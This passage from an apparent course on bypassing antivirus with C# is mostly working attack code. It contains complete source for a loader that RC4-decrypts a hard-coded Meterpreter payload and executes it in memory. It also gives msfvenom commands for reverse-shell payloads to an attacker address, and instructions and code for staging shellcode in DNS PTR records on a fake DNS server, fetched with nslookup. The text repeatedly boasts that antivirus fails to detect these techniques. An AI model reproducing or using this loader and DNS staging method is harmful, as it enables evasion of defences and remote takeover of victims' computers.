Console.Write(xKey[i].ToString(\"x2\") + \" \");\n\r\n\r            // }\n\r\n\r \n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r \n\r\n\r            /// Converting String to Byte for Encrypted Meterpreter Payload by Second Argument\n\r\n\r           \n\r\n\r            Payload_Encrypted = args[0].ToString();\n\r\n\r \n\r\n\r            string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(\' \');\n\r\n\r \n\r\n\r            byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];\n\r\n\r \n\r\n\r            for (int i = 0; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)\n\r\n\r            {\n\r\n\r                byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());\n\r\n\r                _X_to_Bytes[i] = current;\n\r\n\r            }\n\r\n\r            try\n\r\n\r            {\n\r\n\r               \n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"[!] Loading Encrypted Meterprter Payload in Memory Done.\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r \n\r\n\r                byte[] Final_Payload = Decrypt(xKey, _X_to_Bytes);\n\r\n\r               \n\r\n\r                Console.WriteLine(\"[&gt;] Decrypting Meterprter Payload by KEY in Memory Done.\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"Bingo Meterpreter session by Encrypted Payload ;)\");\n\r\n\r \n\r\n\r                UInt32 funcAddr = VirtualAlloc(0, (UInt32)Final_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                Marshal.Copy(Final_Payload, 0, (IntPtr)(funcAddr), Final_Payload.Length);\n\r\n\r \n\r\n\r                IntPtr hThread = IntPtr.Zero;\n\r\n\r                UInt32 threadId = 0;\n\r\n\r                IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\r\n\r                WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r            }\n\r\n\r            catch (Exception)\n\r\n\r            {\n\r\n\r \n\r\n\r                throw;\n\r\n\r            }\n\r\n\r \n\r\n\r        }\n\r\n\r \n\r\n\r        public static byte[] Decrypt(byte[] key, byte[] data)\n\r\n\r        {\n\r\n\r            return EncryptOutput(key, data).ToArray();\n\r\n\r        }\n\r\n\r        private static byte[] EncryptInitalize(byte[] key)\n\r\n\r        {\n\r\n\r            byte[] s = Enumerable.Range(0, 256)\n\r\n\r              .Select(i =&gt; (byte)i)\n\r\n\r              .ToArray();\n\r\n\r \n\r\n\r            for (int i = 0, j = 0; i &lt; 256; i++)\n\r\n\r            {\n\r\n\r                j = (j + key[i % key.Length] + s[i]) &amp; 255;\n\r\n\r \n\r\n\r                Swap(s, i, j);\n\r\n\r            }\n\r\n\r \n\r\n\r            return s;\n\r\n\r        }\n\r\n\r        private static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)\n\r\n\r        {\n\r\n\r            byte[] s = EncryptInitalize(key);\n\r\n\r \n\r\n\r            int i = 0;\n\r\n\r            int j = 0;\n\r\n\r \n\r\n\r            return data.Select((b) =&gt;\n\r\n\r            {\n\r\n\r                i = (i + 1) &amp; 255;\n\r\n\r                j = (j + s[i]) &amp; 255;\n\r\n\r \n\r\n\r                Swap(s, i, j);\n\r\n\r \n\r\n\r                return (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);\n\r\n\r            });\n\r\n\r        }\n\r\n\r        private static void Swap(byte[] s, int i, int j)\n\r\n\r        {\n\r\n\r            byte c = s[i];\n\r\n\r \n\r\n\r            s[i] = s[j];\n\r\n\r            s[j] = c;\n\r\n\r        }\n\r\n\r \n\r\n\r        private static UInt32 MEM_COMMIT = 0x1000;\n\r\n\r        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r \n\r\n\r    }\n\r\n\r}\n\r\n\r \n\r\n\r \n\r\n\rafter Hard-coded KEY in Source Code you will have New Syntax like “Picture4”: \n\r\n\r \n\r\n\rSyntax :  NativePayload_Decryption.exe “Encrypted Payload”\n\r\n\r  \n\r\n\r\n\r\n\r \n\r\n\r \n\r\n\rif you want to Hard-coded Meterpreter Payload to Source code then you should change your Code like “Picture5” so you can use (Source_4) for this technique.\n\r\n\r  \n\r\n\rafter Hard-coded Encrypted Meterpreter Payload and KEY in Source Code you will have New Syntax like “Picture6” without any Parameter or Argument .\n\r\n\r \n\r\n\rSyntax :  NativePayload_Decryption.exe \n\r\n\r  \n\r\n\rSource_4: Hard-coded KEY and Encrypted Meterpreter Payload in source code.\n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\rusing System.Text;\n\r\n\r \n\r\n\rnamespace NativePayload_Decryption\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r       \n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r            Console.WriteLine(\"Payload Decryption tool for Meterpreter Payloads \");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Published by Damon Mohammadbagher  2016-2017\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.WriteLine(\"[!] Using RC4 Decryption for your Payload By KEY.\");\n\r\n\r            string Payload_Encrypted;\n\r\n\r \n\r\n\r            byte[] xKey = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00,\n\r\n\r                0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };\n\r\n\r            \n\r\n\r            //string[] Input_Keys = args[0].Split(\' \');\n\r\n\r            //byte[] xKey = new byte[Input_Keys.Length];\n\r\n\r \n\r\n\r            Console.Write(\"[!] Decryption KEY is : \");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r            /// Converting String to Byte for KEY by first Argument\n\r\n\r            //for (int i = 0; i &lt; Input_Keys.Length; i++)\n\r\n\r            //{\n\r\n\r            //    xKey[i] = Convert.ToByte(Input_Keys[i], 16);\n\r\n\r            //    Console.Write(xKey[i].ToString(\"x2\") + \" \");\n\r\n\r            //}\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            /// Converting String to Byte for Encrypted Meterpreter Payload by Second Argument         \n\r\n\r \n\r\n\r            //Payload_Encrypted = args[0].ToString();\n\r\n\r            Payload_Encrypted = \"0 84 37 71 69 109 37 60 21 235 228 108 17 204 176 36 198 93 237 156 145 184 238 1 181 165 137 167 87 222 160 187 124 92 202 24 168 213 233 136 47 91 129 7 14 9 103 63 95 141 211 34 201 140 241 165 213 137 208 219 133 54 49 0 118 140 100 199 158 10 107 116 107 224 90 214 159 208 228 26 231 73 26 151 85 112 83 140 229 51 128 197 75 241 140 169 228 9 68 236 172 198 13 57 86 126 136 198 101 115 100 168 67 172 1 23 246 143 214 151 253 13 113 69 215 169 12 226 190 215 247 224 137 68 123 43 11 12 207 194 2 0 143 251 187 15 171 245 24 105 3 68 10 81 252 63 250 150 219 229 147 55 50 11 237 89 185 220 100 248 20 180 42 175 246 34 27 1 131 203 175 49 104 33 218 144 110 193 189 206 206 204 62 138 78 2 102 75 130 176 183 93 184 252 9 136 155 117 228 39 177 96 169 181 89 233 114 114 29 56 223 163 247 33 145 203 41 151 165 242 162 133 149 123 84 169 156 172 75 103 144 63 254 1 116 121 152 182 15 109 48 242 80 94 76 100 131 28 114 3 119 227 147 76 105 132 185 70 93 236 253 186 193 177 67 202 216 136 241 19 146 16 146 184 10 41 206 30 4 95 176 204 190 95 71 7 146 160 30 113 50 249 159 156 194 14 53 130 12 252 44 159 214 216 139 81 51 145 166 5 194 165 155 160 230 79 185 162 170 103 2 110 95 48 207 207 215 245 167 106 133 70 28 238 114 70 20 7 9 173 132 7 76 226 242 193 123 148 140 199 238 178 109 188 235 52 137 157 233 228 81 21 238 197 38 148 121 77 139 229 155 23 205 66 195 75 35 170 53 81 201 168 212 241 100 156 110 97 185 225 216 106 6 4 171 46 150 154 186 122 208 171 210 33 38 188 129 153 108 126 196 85 178 29 210 128 120 137 73 176 239 6 176 142 238 215 213 176 182 116 152 48 133 217 212 138 97 4 33 165 45 73 54 254 153 125 218 97 156 185 191 100 229 210 112 99 221 159 198 220 211 134 120 15 116 52 150 214 214 8 175 162 109 236 32 48 109 20 106 48 132 102 114 73 23 254 207 38 139 14 109 223 99 164 53 213 52 15 33 211\";\n\r\n\r \n\r\n\r            string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(\' \');\n\r\n\r \n\r\n\r            byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];\n\r\n\r \n\r\n\r            for (int i = 0; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)\n\r\n\r            {\n\r\n\r                byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());\n\r\n\r                _X_to_Bytes[i] = current;\n\r\n\r            }\n\r\n\r            try\n\r\n\r            {\n\r\n\r               \n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"[!] Loading Encrypted Meterprter Payload in Memory Done.\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r \n\r\n\r                byte[] Final_Payload = Decrypt(xKey, _X_to_Bytes);\n\r\n\r               \n\r\n\r                Console.WriteLine(\"[&gt;] Decrypting Meterprter Payload by KEY in Memory Done.\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"Bingo Meterpreter session by Encrypted Payload ;)\");\n\r\n\r \n\r\n\r                UInt32 funcAddr = VirtualAlloc(0, (UInt32)Final_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                Marshal.Copy(Final_Payload, 0, (IntPtr)(funcAddr), Final_Payload.Length);\n\r\n\r \n\r\n\r                IntPtr hThread = IntPtr.Zero;\n\r\n\r                UInt32 threadId = 0;\n\r\n\r                IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\r\n\r                WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r            }\n\r\n\r            catch (Exception)\n\r\n\r            {\n\r\n\r\n\r\n\r                throw;\n\r\n\r            }\n\r\n\r \n\r\n\r        }\n\r\n\r \n\r\n\r        /// &lt;summary&gt;\n\r\n\r        /// RC4 Decryption Section\n\r\n\r        /// &lt;/summary&gt;    \n\r\n\r        public static byte[] Decrypt(byte[] key, byte[] data)\n\r\n\r        {\n\r\n\r            return EncryptOutput(key, data).ToArray();\n\r\n\r        }\n\r\n\r        private static byte[] EncryptInitalize(byte[] key)\n\r\n\r        {\n\r\n\r            byte[] s = Enumerable.Range(0, 256)\n\r\n\r              .Select(i =&gt; (byte)i)\n\r\n\r              .ToArray();\n\r\n\r \n\r\n\r            for (int i = 0, j = 0; i &lt; 256; i++)\n\r\n\r            {\n\r\n\r                j = (j + key[i % key.Length] + s[i]) &amp; 255;\n\r\n\r \n\r\n\r                Swap(s, i, j);\n\r\n\r            }\n\r\n\r \n\r\n\r            return s;\n\r\n\r        }\n\r\n\r        private static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)\n\r\n\r        {\n\r\n\r            byte[] s = EncryptInitalize(key);\n\r\n\r \n\r\n\r            int i = 0;\n\r\n\r            int j = 0;\n\r\n\r \n\r\n\r            return data.Select((b) =&gt;\n\r\n\r            {\n\r\n\r                i = (i + 1) &amp; 255;\n\r\n\r                j = (j + s[i]) &amp; 255;\n\r\n\r \n\r\n\r                Swap(s, i, j);\n\r\n\r \n\r\n\r                return (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);\n\r\n\r            });\n\r\n\r        }\n\r\n\r        private static void Swap(byte[] s, int i, int j)\n\r\n\r        {\n\r\n\r            byte c = s[i];\n\r\n\r \n\r\n\r            s[i] = s[j];\n\r\n\r            s[j] = c;\n\r\n\r        }\n\r\n\r \n\r\n\r        \n\r\n\r        /// &lt;summary&gt;\n\r\n\r        /// Windows API Importing Section\n\r\n\r        /// &lt;/summary&gt;\n\r\n\r        private static UInt32 MEM_COMMIT = 0x1000;\n\r\n\r        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r \n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r \n\r\n\r \n\r\n\r    }\n\r\n\r}\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r\n\r\n\r \n\r\n\rat a glance : in this chapter we had two C# Source Code , First for Encryption and second for Decryption (Backdoor) also we used Argument Technique for Inputing Data like KEY or Encrypted Meterpreter Payload to C# Backdoor so Inputing Data by Argument is really Useful Technique if you do not Want to Hard-coded KEY or Payloads in your Source code so by this Technique AV can not Detect your KEY or Payloads so in this Case Anti-viruses “maybe” Will Detect your C# Codes like these Sections of your Backdoor Code :\n\r\n\r \n\r\n\r                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\r\n\r                WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r \n\r\n\ror maybe some Avs will Detect this Section :\n\r\n\r \n\r\n\r               UInt32 funcAddr = VirtualAlloc(0, (UInt32)Final_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r \n\r\n\r \n\r\n\ror maybe this Section of C# Backdoor for Decryption :\n\r\n\r \n\r\n\r              byte[] Final_Payload = Decrypt(xKey, _X_to_Bytes);\n\r\n\r \n\r\n\r \n\r\n\rin the Next Chapter we should talk about these lines of your Codes also we should talk about when these lines will detect by Avs then how Hackers can Bypass your signature-based Anti-viruses by Changing These lines to New Codes also Changing Signature for Codes very simple so in “chapter 3 of Course” you will see how Hackers can bypass our signature-based Anti-viruses by some tricks in C# Programming very simple. \n\r\n\r \n\r\n\rNote : Some chapters are not “Free” and Next Chapter 3 in this course Is not free so I will “jump” to other chapters , “I am sorry”.\n\r\n\r \n\r\n\r \n\r\n\rNow you can Watch one by one Videos.\n\r\n\r \n\r\n\r ","","topics\\Chapter 2.html","\n\r\n\r \n\r\n\rChapter 3 : DATA Transferring / Downloading Method by DNS Traffic (PTR Records)\n\r\n\r\n\r•Goal : Understanding this technique by C# \n\r\n\r\n\r•Creating C#.NET Code and Testing. \n\r\n\r\n\r \n\r\n\rUnderstanding this technique by C# : Bypassing Anti-viruses with Transferring Backdoor Payloads via DNS traffic\n\r\n\rIn this chapter I want to explain how can bypass anti-viruses without encryption method for payloads so in this chapter I want to talk about DATA-Payload “Infiltration/Exfiltration/Transferring” Technique by DNS Traffic. In this technique I want to use DNS protocol to Transfer my backdoor payloads from attacker computer to Client computer so in this case we need one backdoor code “without” hard-coded payload or encrypted Payload.\n\r\n\rTherefore risk for detecting by Anti-Viruses is very low in this case.\n\r\n\rWhy DNS protocol?\n\r\n\rBecause DNS traffic in the most networks are available without monitoring or Filtering by IPS/IDS or hardware firewalls and I know you can Check DNS Traffic by Snort IPS/IDS or something like that but detecting new Payloads via DNS Traffic by signatures is Difficult but is possible for network administrators .\n\r\n\rIn this article I want to show you one way to hiding your payloads by DNS Request/Response over Network.\n\r\n\rWhere is vulnerability point in this case?\n\r\n\rWhen you want to use Payloads without encryption or Hard coded Payloads in your backdoor file like this case you need to transfer Payloads over Network from your system to target computer by some Protocol like HTTP and DNS or … , in this case we want to transfer these Payloads over DNS Traffic also execute these Payloads in Target computer memory so vulnerability point is Payload location and vulnerability point is Anti-viruses methods for Detecting Malware. Because in this case we don’t have Payloads on File-systems so we have Payload in memory and Network Traffic.\n\r\n\rNote : “Unfortunately” Network traffic monitoring and Memory Monitoring/Scanning by AVs to Detect malware code do not work very well or do not work always in the most Anti-viruses with or without IPS/IDS features.\n\r\n\r \n\r\n\rExample: Backdoor Payloads in DNS Zone with PTR records and A records.Picture 1: DNS Zone (IPAddress_to_DnsNameFQDN). \n\r\n\rAs you can see in this DNS zone I have two PTR records with meterpreter Payload like two FQDN And I have two PTR Record for Backdoor Reconnect setting Time also one A record.\n\r\n\rSplitting Payload values and Records!\n\r\n\rIf you want to bypassing Payload detection over Network DNS traffic by signature base Firewalls or IPS/IDS tools\n\r\n\rOne good way for do this is splitting your Payloads into DNS Records with same Type like PTR or other types also you can encrypt your Payloads then use these Protocols. it depends on you and your target network.\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rYou can see in picture 1, I have five records for Splitting one Payload in this case Meterpreter Payload Line one.\n\r\n\rTherefore payloads for these records are equal with payload for this record 1.1.1.0\n\r\n\rExample: 1.0.1.0 + 1.0.1.1 + 1.0.1.2 + 1.0.1.3 + 1.0.1.4 = 1.1.1.0\n\r\n\rIt means you can have:\n\r\n\rfive DNS request for 1.0.1.x * 5 &lt;=&gt; 5 response with result like (1 response from payload-0 by PTR record 1.1.1.0)\n\r\n\rOr\n\r\n\rone DNS Request for 1.1.1.0 &lt;=&gt; 1 Response by (payload-0 by PTR record 1.1.1.0)\n\r\n\rIn client side you can get this information from fake DNS server by more tools or technique but I want to use NSLOOKUP command prompt by backdoor because I think this is very simple to use.\n\r\n\rAs you can see in picture 2, I try to test DNS traffic from Fake DNS server to Client by NSLOOKUP tool.Picture 2: Nslookup command and Testing DNS Traffic. \n\r\n\rNow I want to talk about how can make Fake DNS server with linux and Meterpreter Payload via DNS Records And finally use my tool NativePayload_DNS.exe to execute Payload and getting Meterpreter session by DNS traffic.\n\r\n\rSTEP1: Make Fake DNS Server with Meterpreter Payloads Step by step:\n\r\n\rIn this step you should make Meterpreter Payload with Msfvenom Tool like picture 4 and copy that Payload line by line to dns.txt file then Use this file by DNSSpoof tool for making Fake DNS Server with kali Linux.\n\r\n\rBut before I explain how can do this first I should show you Meterpreter Payload with “Exe” file and Test this Payload with All anti-viruses then you can see this Payload and this signature will detect by the most Anti-viruses when you used that with EXE format.\n\r\n\rWhy I want to show this one?\n\r\n\rBecause I want to show you , I used two same Payloads by two techniques first by “EXE” format file and second by Transfer via DNS Traffic and you can see EXE format will detect by Anti-viruses but AVs can’t Detect Second technique “Transfer by DNS traffic” and we know both method had same Payload .\n\r\n\r \n\r\n\r\n\r\n\rExample1 , First technique EXE format: msfvenom –-platform windows –arch x86_64 –p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 –f exe &gt; /root/Desktop/payload.exe\n\r\n\rAs you can see in picture 3 my payload with EXE format detected by 11 anti-viruses.\n\r\n\r  \n\r\n\rPicture 3: EXE Format payload Detected by AVs\n\r\n\rOk now for second technique you should use this one with C type or Csharp type ( -f : Transform Type)\n\r\n\rExample2 , second technique DNS Traffic: msfvenom –-platform windows –arch x86_64 –p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 –f c &gt; /root/Desktop/payload.txt\n\r\n\rAfter make payload.txt file , now you should make dns.txt file and copy your payloads line by line to dns.txt file like format as you can see in picture 4.\n\r\n\rThis is really important you have correct Format in dns.txt file.\n\r\n\rBecause we want to use this file by Dnsspoof tool with linux and your format should be something like this:\n\r\n\rIpaddress “{payload}.domain.com”\n\r\n\r1.1.1.0 “0xfc0x480x830xe40xf00xe8.1.com”\n\r\n\r1.1.1.1 “0xbc0xc80x130xff0x100x08.1.com”\n\r\n\rIn this case because my C# backdoor code customized for domain name “1.com” we should use this name for domain Or something like that “2.com”, “3.net”, “t.com” or domain with one char name + \".com\"\n\r\n\rSo in this case ipaddress “1.1.1.x” is our Counter for our Payload lines in our dns.txt file.\n\r\n\r1.1.1.0 --&gt; Line 0 in payload.txt file --&gt; “{payload0}.1.com”\n\r\n\r1.1.1.1 --&gt; Line 1 in payload.txt file --&gt; “{payload1}.1.com”\n\r\n\r1.1.1.2 --&gt; Line 2 in payload.txt file --&gt; “{payload2}.1.com” \n\r\n\rPicture 4: step1 for make fake DNS server and Meterpreter payloads\n\r\n\rAfter make dns.txt file you should have this file like picture 5. \n\r\n\rPicture5: Dns.txt file for make Fake DNS Server by dnsspoof tool\n\r\n\rOk now you can use dnsspoof tool like picture 6 for starting Fake DNS Server in your linux. \n\r\n\rPicture 6: dnsspoof tool\n\r\n\rin step 2 we need to use one backdoor for Downloading Payloads from Fake DNS server by DNS Traffic.\n\r\n\rIn this case I made this C# source code for do that and in my code I used nslookup.exe tool for sending dns requests finally my code will dump backdoor Payloads via DNS PTR Response from FakeDNSserver over network.\n\r\n\r \n\r\n\rSTEP2:\n\r\n\rAfter compile this code you have one exe file and for execute this exe file you should use this syntax in command prompt:\n\r\n\rCommand Syntax:\n\r\n\rNativePayload_DNS.exe “Start_IpAddress” Counter “FakeDNSServer_IpAddress”\n\r\n\rExample: C:\\&gt; NativePayload_DNS.exe 1.1.1. 34 192.168.1.50\n\r\n\r \n\r\n\rStart_IpAddress : is your first IpAddress for you PTR Records without last section for HostID { 1 . 1 . 1 . } so in this case you should type three “1.” for this argument.\n\r\n\rCounter : is DNS PTR Records number in this case we have 1.1.1.0 …. 1.1.1.33 in our dns.txt file so number is 34\n\r\n\rFakeDNSServer_IpAddress : FakeDNS_IP is our DNS server IPaddress or Attacker FakeDNSserver in this case our kali linux ipaddress is 192-168-1-50\n\r\n\rBefore execute this backdoor remember you should made listener for metasploit\n\r\n\rin your kali linux with ipadress 192-168-1-50.\n\r\n\r \n\r\n\rNow you can execute this backdoor like picture 7:\n\r\n\rNativePayload_DNS.exe 1.1.1. 34 192.168.1.50Picture 7 : NativePayload_DNS tool \n\r\n\rAs you can see in picture 7 this backdoor tried to send DNS Request for ipaddress 1.1.1.x also you can see each Response.\n\r\n\rIn the next picture you can see our network traffic between Client and Attacker FakeDNS_ServerPicture 8: Transfer Meterpreter Payloads by DNS Traffic \n\r\n\rFinally after 34 countdown you will have Meterpreter Session in Attacker Side like picture 9 and unfortunately as you can see my Anti-Viruses can’t detect this Technique , and I think the most AVs can’t Detect this Technique so if you Check this Technique by other AVs please tell me by Writing comment here also please explain which one of AVs detected this Technique and what version ;) thank you guys.Picture 9: Meterpreter Session by DNS Traffic \n\r\n\rAnd you can see my anti-virus again bypassed ;-) also this is my Result for scanning my Source Code by All anti-viruses now you can compare “Picture 3” with “Picture 10” Both Backdoors worked by same Payloads , (warning : Don\'t use VirusTotal or this site for testing your Codes Never ever)Picture 10: NativePayload_DNS (AVs result = 0 detected) \n\r\n\rAnd in the next picture you can see what happened behind my C# source code by NSLOOKUP tool. \n\r\n\rPicture 11 : Nslookup and UDP connections for DNS Traffic\n\r\n\rFinally you can see my Meterpreter Session with tcpview tool and putty tool in next picturesPicture 12: Tcpview and TCP connection established when Backdoor Payload Downloaded from DNSServer. \n\r\n\rin picture 13 you can see meterpreter Session too :Picture 13: Meterpreter Session. \n\r\n\rAt a glance : you can’t trust to Anti-viruses for defense always so with this technique or other ways for Transfer Payload by other protocols in network , your network and your Client/Server is Vulnerable too so please check this technique in your Anti-viruses and share your Experience here by comments .\n\r\n\rCreating C#.NET Code and Testing:\n\r\n\r \n\r\n\rIn this technique we used DNS traffic by PTR records so for doing this we need some tools or Code for Sending DNS traffic so in this case our Code uses NSLOOKUP tool for DNS requests and Response so in our C# Code we need to use this Command by this Code :\n\r\n\r public static string __nslookup(string DNS_PTR_A, string DnsServer)\n\r\n\r        {           \n\r\n\r            /// Make DNS traffic for getting Meterpreter Payloads by nslookup\n\r\n\r \n\r\n\r            ProcessStartInfo ns_Prcs_info = new ProcessStartInfo(\"nslookup.exe\", DNS_PTR_A + \" \" + DnsServer);\n\r\n\r            ns_Prcs_info.RedirectStandardInput = true;\n\r\n\r            ns_Prcs_info.RedirectStandardOutput = true;\n\r\n\r            ns_Prcs_info.UseShellExecute = false;\n\r\n\r            // you can use Thread Sleep here \n\r\n\r \n\r\n\r            Process nslookup = new Process();\n\r\n\r            nslookup.StartInfo = ns_Prcs_info;\n\r\n\r            nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n\r\n\r            nslookup.Start();\n\r\n\r \n\r\n\r            /// if you want to change your Domain Name from \"1.com\" to \"22.com\"\n\r\n\r            /// then you should change these Settings and Values too ;)\n\r\n\r \n\r\n\r            string computerList = nslookup.StandardOutput.ReadToEnd();\n\r\n\r            string[] lines = computerList.Split(\'\\r\', \'n\');\n\r\n\r            string last_line = lines[lines.Length - 4];\n\r\n\r            string temp_1 = last_line.Remove(0, 11);\n\r\n\r            _Records = \"\\\"\" + temp_1;\n\r\n\r            int i = temp_1.LastIndexOf(\'.\');\n\r\n\r            string temp_2 = temp_1.Remove(i, (temp_1.Length - i));\n\r\n\r            int b = temp_2.LastIndexOf(\'.\');\n\r\n\r            string final = temp_2.Remove(b, temp_2.Length - b);\n\r\n\r            return final;\n\r\n\r     }Code 1: \n\r\n\ras you can see in this “Code 1”  our DNS_PTR_A variable is our IPAddress in this case “1.1.1.” so\n\r\n\rc:\\&gt;  NativePayload_DNS.exe 1.1.1.  34  192.168.1.50\n\r\n\r\n\r1.1.1. is our DNS_PTR_A variable \n\r\n\r\n\r34 is our _IPAddress_counter variable (we will talk about that in next pictures) \n\r\n\r\n\r192.168.1.50 is our  DnsServer variable  \n\r\n\r\n\r \n\r\n\ralso in Picture  “Code 1” you can see “Section 1” code , by this “Section 1”  you will have NSLOOKUP with PTR output for each IPAddress like this , in this example this is Nslookup output “PTR Record” for IPAddress “1.1.1.1” also you can see this output in “Picture 2” by Cmd.exe too.\n\r\n\r\"0xfc0x480x830xe40xf00xe80xcc0x000x000x000x410x510x410x500x52.1.com\"\n\r\n\rNote: this Section 1 optimized for Domain Names by one character like “1.com” or ”a.com” or “b.net” or “c.org” so if you want to change your Domain Name from one Character to two or three characters then you should change these codes too.\n\r\n\r Code 2: \n\r\n\r\n\r\n\rin Picture “Code 2” you can see how our DNS_PTR_A variable will work in lines 105,106,107 so by this code\n\r\n\r for (int i = 0; i &lt; _IPaddress_Counter; i++)\n\r\n\r                {\n\r\n\r                    _DATA[i] = __nslookup(_IPaddress_Begin + i, _DnsServer);\n\r\n\r                    DATA += _DATA[i].ToString();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                    Console.WriteLine(\"DNS Request Send: {0}\", (_IPaddress_Begin + i).ToString());\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                    Console.WriteLine(\"DNS Response type PTR Record: {0}\", _Records);\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                }\n\r\n\rImportant point in this code is here _IPaddress_Begin + i by this code you will have IPAddress 1.1.1. + I because our _Ipaddress_Begin = 1.1.1. and our I variable was started with 0 up to 33 , why 33 because our _IPaddress_Counter = 33 , it means we have 34 IPAddress .\n\r\n\r       _DATA[i] = __nslookup(_IPaddress_Begin + i, _DnsServer);\n\r\n\rso we have something like this Commands by this section of code :\n\r\n\rnslookup 1.1.1.0  192.168.1.50   output == &gt;  \"0xfc0x480x830xe40xf00xe80xcc0x000x000x000x410x510x410x500x52.1.com\"\n\r\n\rnslookup 1.1.1.1  192.168.1.50   output == &gt;  \"0x510x560x480x310xd20x650x480x8b0x520x600x480x8b0x520x180x48.1.com\"\n\r\n\rnslookup 1.1.1.2  192.168.1.50   output == &gt;  \"0x8b0x520x200x480x8b0x720x500x480x0f0xb70x4a0x4a0x4d0x310xc9.1.com\"\n\r\n\rnslookup 1.1.1.3  192.168.1.50   output == &gt;  \"0x480x310xc00xac0x3c0x610x7c0x020x2c0x200x410xc10xc90x0d0x41.1.com\"\n\r\n\r.\n\r\n\r.\n\r\n\r.\n\r\n\rnslookup 1.1.1.31  192.168.1.50   output == &gt;  \"0x570x590x410xba0x750x6e0x4d0x610xff0xd50x490xff0xce0xe90x3c.1.com\"\n\r\n\rnslookup 1.1.1.32  192.168.1.50   output == &gt;  \"0xff0xff0xff0x480x010xc30x480x290xc60x480x850xf60x750xb40x41.1.com\"\n\r\n\rnslookup 1.1.1.33  192.168.1.50   output == &gt;  